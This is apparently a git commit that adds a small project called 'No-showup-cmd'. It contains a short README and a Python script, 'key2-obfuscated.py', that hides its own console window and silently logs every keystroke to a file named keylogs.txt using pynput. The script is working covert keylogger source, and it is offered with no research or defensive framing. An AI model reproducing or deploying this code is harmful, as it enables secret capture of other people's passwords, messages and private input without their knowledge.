3f6d72e1115e7f29f95212d182e376aa368a0b46
When the storm comes, it turns out how many rooted trees are next to you <103410775+CharonDefalt@users.noreply.github.com>
2023-09-05 08:38:41 +0330

    Add files via upload

---
+++ No-showup-cmd/README.md
@@ -0,0 +1,5 @@
+if you want to stop kill it from taskmanager
+
+kill python  kill cmd
+
+:)
---
+++ No-showup-cmd/key2-obfuscated.py
@@ -0,0 +1,22 @@
+import sys
+import ctypes
+import os
+
+# Check if running in a console window
+if not hasattr(sys, 'frozen'):
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# Rest of your script here
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
+    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
